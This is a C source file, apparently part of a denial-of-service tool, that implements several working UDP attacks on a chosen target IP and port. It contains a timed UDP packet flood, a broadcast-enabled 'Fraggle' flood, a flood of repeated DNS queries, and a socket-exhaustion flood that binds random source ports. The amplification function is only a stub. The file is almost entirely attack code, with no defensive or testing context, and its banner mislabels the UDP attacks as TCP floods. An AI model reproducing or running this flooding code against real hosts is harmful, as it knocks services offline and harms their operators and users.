#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#include "tung.h"
#include "utils.h"
#include "logs.h"

/* Prototypes */
void perform_udp_flood(struct attack_opts_t *opts);
void perform_udp_ampl(struct attack_opts_t *opts);
void perform_udp_fraggle(struct attack_opts_t *opts);
void perform_udp_app_layer_dos(struct attack_opts_t *opts);
void perform_udp_socket_exhaustion(struct attack_opts_t *opts);

/* Internal helpers */
static int create_udp_socket();
static void print_attack_start(char *type_name, struct attack_opts_t *opts);
static struct sockaddr_in build_target(const char *ip, const char *port);
static int should_continue(time_t start, uint16_t duration);

static int should_continue(time_t start, uint16_t duration) {
        return (time(NULL) - start) < duration;
}

static int create_udp_socket() {
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sockfd < 0)
        {
                perror("socket");
                exit(EXIT_FAILURE);
        }
        return sockfd;
}

static void print_attack_start(char *type_name, struct attack_opts_t *opts) {
	 LOG_INFO("Started %s attack to %s for %d seconds %s", 
                 type_name, opts->atk_target, opts->atk_duration, 
                 opt_verboose ? "(detailed packet info will be shown)" : "");

	 printf(COLOR_YELLOW "▸ Attack type:" COLOR_RESET " TCP %s Flood\n", type_name);
         printf(COLOR_YELLOW "▸ Target:" COLOR_RESET " %s\n", opts->atk_target);
         printf(COLOR_YELLOW "▸ Port:" COLOR_RESET " %s\n", opts->atk_port);
         printf(COLOR_YELLOW "▸ Duration:" COLOR_RESET " %d seconds\n\n", opts->atk_duration);
}

static struct sockaddr_in build_target(const char *ip, const char *port) {
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(atoi(port));
        if (inet_pton(AF_INET, ip, &addr.sin_addr) <= 0) {
                fprintf(stderr, "Invalid IP address: %s\n", ip);
                exit(EXIT_FAILURE);
        }
        return addr;
}

void perform_udp_flood(struct attack_opts_t *opts) {
	print_attack_start("UDP Flood", opts);
	
	register uint64_t pk_counter = 0;
        int sockfd = create_udp_socket();
        struct sockaddr_in target = build_target(opts->atk_target, opts->atk_port);
        char buffer[1024];

        fill_buffer_with_random_bytes(buffer);
	
	uint16_t checksum = compute_checksum(buffer + 2, sizeof(buffer) - 2);
    	buffer[0] = checksum >> 8;
    	buffer[1] = checksum & 0xFF;

        time_t start = time(NULL);

        while (should_continue(start, opts->atk_duration)) {
                sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target));
		pk_counter++;
                if (opts->atk_rate > 0)
                        usleep(1000000 / opts->atk_rate);
        }
	
	LOG_INFO("Attack ended after %d seconds, %lu packets sent", opts->atk_duration, pk_counter);
        close(sockfd);
}

void perform_udp_ampl(struct attack_opts_t *opts) {
	(void)opts;
        printf("UDP Amplification attack is not yet implemented.\n");
}

void perform_udp_fraggle(struct attack_opts_t *opts) {
	print_attack_start("UDP Fraggle", opts);
        int sockfd = create_udp_socket();

        int enable = 1;
        setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &enable, sizeof(enable));

        struct sockaddr_in target = build_target(opts->atk_target, opts->atk_port);
        char message[1024];

        fill_buffer_with_random_bytes(message);

	uint16_t checksum = compute_checksum(message + 2, sizeof(message) - 2);
    	message[0] = checksum >> 8;
    	message[1] = checksum & 0xFF;

        time_t start = time(NULL);

        while (should_continue(start, opts->atk_duration)) {
                sendto(sockfd, message, sizeof(message), 0, (struct sockaddr *)&target, sizeof(target));
                if (opts->atk_rate > 0)
                        usleep(1000000 / opts->atk_rate);
        }

        close(sockfd);
}

void perform_udp_app_layer_dos(struct attack_opts_t *opts) {
	print_attack_start("UDP App Layer DoS", opts);
        int sockfd = create_udp_socket();
        struct sockaddr_in target = build_target(opts->atk_target, opts->atk_port);

        uint8_t dns_query[] = {
            0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x03, 'w', 'w', 'w',
            0x06, 'g', 'o', 'o', 'g', 'l', 'e',
            0x03, 'c', 'o', 'm',
            0x00, 0x00, 0x01, 0x00, 0x01};

	size_t dns_len = sizeof(dns_query);

    	uint16_t checksum = compute_checksum(dns_query + 2, dns_len - 2);
    	dns_query[0] = checksum >> 8;
    	dns_query[1] = checksum & 0xFF;

        time_t start = time(NULL);

        while (should_continue(start, opts->atk_duration)) {
                sendto(sockfd, dns_query, sizeof(dns_query), 0, (struct sockaddr *)&target, sizeof(target));
                if (opts->atk_rate > 0)
                        usleep(1000000 / opts->atk_rate);
        }

        close(sockfd);
}

void perform_udp_socket_exhaustion(struct attack_opts_t *opts) {
	print_attack_start("UDP Socket Exhaustion", opts);
        struct sockaddr_in target = build_target(opts->atk_target, opts->atk_port);

        time_t start = time(NULL);

        while (should_continue(start, opts->atk_duration)) {
                int sockfd = create_udp_socket();

                struct sockaddr_in src;
                memset(&src, 0, sizeof(src));
                src.sin_family = AF_INET;
                src.sin_port = htons(rand() % 65535);
                src.sin_addr.s_addr = INADDR_ANY;

                bind(sockfd, (struct sockaddr *)&src, sizeof(src));

                char buffer[1024];
                fill_buffer_with_random_bytes(buffer);
		
		uint16_t checksum = compute_checksum(buffer + 2, sizeof(buffer) - 2);
        	buffer[0] = checksum >> 8;
        	buffer[1] = checksum & 0xFF;
                
		sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target));
                close(sockfd);

                if (opts->atk_rate > 0)
                        usleep(1000000 / opts->atk_rate);
        }
}
